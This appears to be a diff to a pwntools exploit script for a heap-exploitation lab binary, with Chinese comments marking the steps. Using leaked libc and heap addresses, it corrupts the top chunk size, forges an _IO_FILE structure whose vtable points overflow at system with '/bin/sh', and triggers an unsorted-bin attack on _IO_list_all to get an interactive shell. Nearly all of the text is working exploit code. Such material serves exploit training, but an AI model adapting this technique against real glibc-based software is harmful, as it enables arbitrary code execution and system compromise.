@@ -18,44 +18,71 @@ def start():
 
 # Select the "malloc (small)" option.
 def small_malloc():
-    io.send("1")
-    io.recvuntil("> ")
+    io.send(b"1")
+    io.recvuntil(b"> ")
 
 # Select the "malloc (large)" option.
 def large_malloc():
-    io.sendthen("> ", "2")
+    io.sendthen(b"> ", b"2")
 
 # Select the "edit (1st small chunk)" option; send data.
 def edit(data):
-    io.send("3")
-    io.sendafter("data: ", data)
-    io.recvuntil("> ")
+    io.send(b"3")
+    io.sendafter(b"data: ", data)
+    io.recvuntil(b"> ")
 
 io = start()
 
 # This binary leaks the address of puts(), use it to resolve the libc load address.
-io.recvuntil("puts() @ ")
+io.recvuntil(b"puts() @ ")
 libc.address = int(io.recvline(), 16) - libc.sym.puts
 
 # This binary leaks the heap start address.
-io.recvuntil("heap @ ")
+io.recvuntil(b"heap @ ")
 heap = int(io.recvline(), 16)
-io.recvuntil("> ")
+print("libc.address: " + hex(libc.address))
+print("heap: " + hex(heap))
+io.recvuntil(b"> ")
 io.timeout = 0.1
 
 # =============================================================================
-
-# =-=-=- EXAMPLE -=-=-=
-
-# Request a small chunk.
+#----- 修改Top Chunk得到一个Free chunk
 small_malloc()
+gdb.attach(io)
 
-# Edit the 1st small chunk.
-edit(b"Y"*24)
-
-# Request a large chunk.
+edit(b"Y"*0x18 + p64(0x1000-0x20+0x1))
 large_malloc()
 
+pause()
+
+#-----伪造IO_FILE劫持vtable
+payload = b"a"*0x10
+flag = b'/bin/sh\x00'
+
+fake_size = p64(0x61)
+fd = p64(0)
+print('libc.sym._IO_list_all ',hex(libc.sym._IO_list_all))
+bk = p64(libc.sym._IO_list_all - 0x10)
+write_base = p64(1)
+write_ptr = p64(2)
+mode = p32(0)
+vtable = p64(heap + 0xd8)                                                                                                                             
+overflow = p64(libc.sym.system)
+
+payload = payload + flag
+payload = payload + fake_size
+payload = payload + fd
+payload = payload + bk
+payload = payload + write_base
+payload = payload + write_ptr
+payload = payload + p64(0)*18
+payload = payload + mode + p32(0) + p64(0) + overflow
+payload = payload + vtable
+
+edit(payload)
+pause()
+#-----触发操作让unsortedbin被sort
+small_malloc()
 # =============================================================================
 
 io.interactive()
